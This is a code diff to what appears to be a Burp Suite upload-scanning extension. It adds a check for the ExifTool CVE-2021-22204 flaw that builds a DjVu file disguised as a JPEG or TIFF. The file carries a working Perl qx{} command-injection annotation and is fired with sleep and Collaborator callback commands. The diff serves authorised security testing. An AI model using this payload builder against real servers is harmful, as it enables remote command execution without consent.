@@ -1068,6 +1068,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
                 self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
                 self._imagetragick_cve_2016_3714_sleep(injector)
                 self._bad_manners_cve_2018_16323(injector)
+                colab_tests.extend(self._exiftool_cve_2021_22204(injector, burp_colab))
                 self._imagemagick_cve_2022_44268(injector)
             # Magick (ImageMagick and GraphicsMagick) - generic, as these are exploiting features
             if injector.opts.modules['magick'].isSelected():
@@ -1457,6 +1458,69 @@ class BurpExtender(IBurpExtender, IScannerCheck,
                 issue = self._create_issue_template(injector.get_brr(), name, details, confidence, severity)
                 # print "Sending basename, replace", repr(basename), repr(replace)
                 colabs.extend(self._send_collaborator(injector, burp_colab, types, basename, content, issue, replace=replace))
+
+        return colabs
+
+    def _exiftool_cve_2021_22204(self, injector, burp_colab):
+        def _build_djvu(payload):
+            info_chunk = '\x00\x01\x00\x01\x18\x00\x2c\x01\x16\x01'
+            chunks = (
+                ('INFO', info_chunk),
+                ('BGjp', ''),
+                ('ANTa', payload),
+            )
+            body = 'DJVU'
+            for chunk_name, chunk_data in chunks:
+                body += chunk_name + struct.pack('!I', len(chunk_data)) + chunk_data
+            return 'AT&TFORM' + struct.pack('!I', len(body)) + body
+
+        def _build_payload(command):
+            annotation = '(metadata (Author "\\\n" . return qx{' + command + '}; #"))'
+            return _build_djvu(annotation)
+
+        types = {
+            ('', BurpExtender.MARKER_ORIG_EXT, 'image/jpeg'),
+            ('', BurpExtender.MARKER_ORIG_EXT, 'image/tiff'),
+            ('', '.jpg', ''),
+            ('', '.jpg', 'image/jpeg'),
+            ('', '.jpeg', ''),
+            ('', '.jpeg', 'image/jpeg'),
+            ('', '.tif', ''),
+            ('', '.tif', 'image/tiff'),
+            ('', '.tiff', ''),
+            ('', '.tiff', 'image/tiff'),
+        }
+
+        name = "ExifTool DjVu RCE"
+        severity = "High"
+        confidence = "Certain"
+        base_detail = "A DjVu file disguised as a common image format was uploaded with the ExifTool " \
+                      "CVE-2021-22204 annotation payload. ExifTool determines the parser from the file content, " \
+                      "not just the extension. See https://nvd.nist.gov/vuln/detail/CVE-2021-22204 and " \
+                      "https://gitlab.com/gitlab-org/gitlab/-/issues/327121 for details. "
+        detail_sleep = "A delay was detected twice when uploading a disguised DjVu file with a payload that " \
+                       "executes a sleep-like command via ExifTool's DjVu parser. Therefore arbitrary command " \
+                       "execution seems possible. The payload used {}."
+        detail_colab = "A Burp collaborator interaction was detected when uploading a disguised DjVu file with " \
+                       "a payload that executes commands via ExifTool's DjVu parser. Therefore arbitrary command " \
+                       "execution seems possible. The payload used {}. Interactions:<br><br>"
+        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "ExiftoolDjvu"
+
+        for cmd_name, cmd, factor, args in self._get_sleep_commands(injector):
+            attack_command = cmd + " " + str(injector.opts.sleep_time * factor) + args
+            issue = self._create_issue_template(injector.get_brr(), name, base_detail + detail_sleep.format(cmd), confidence, severity)
+            self._send_sleep_based(injector, basename + cmd_name, _build_payload(attack_command), types,
+                                   injector.opts.sleep_time, issue)
+
+        if not burp_colab:
+            return []
+        colabs = []
+
+        for cmd_name, cmd, server, replace in self._get_rce_interaction_commands(injector, burp_colab):
+            attack_command = cmd + " " + server
+            issue = self._create_issue_template(injector.get_brr(), name, base_detail + detail_colab.format(cmd), confidence, severity)
+            colabs.extend(self._send_collaborator(injector, burp_colab, types, basename + cmd_name,
+                                                  _build_payload(attack_command), issue, replace=replace))
 
         return colabs
 
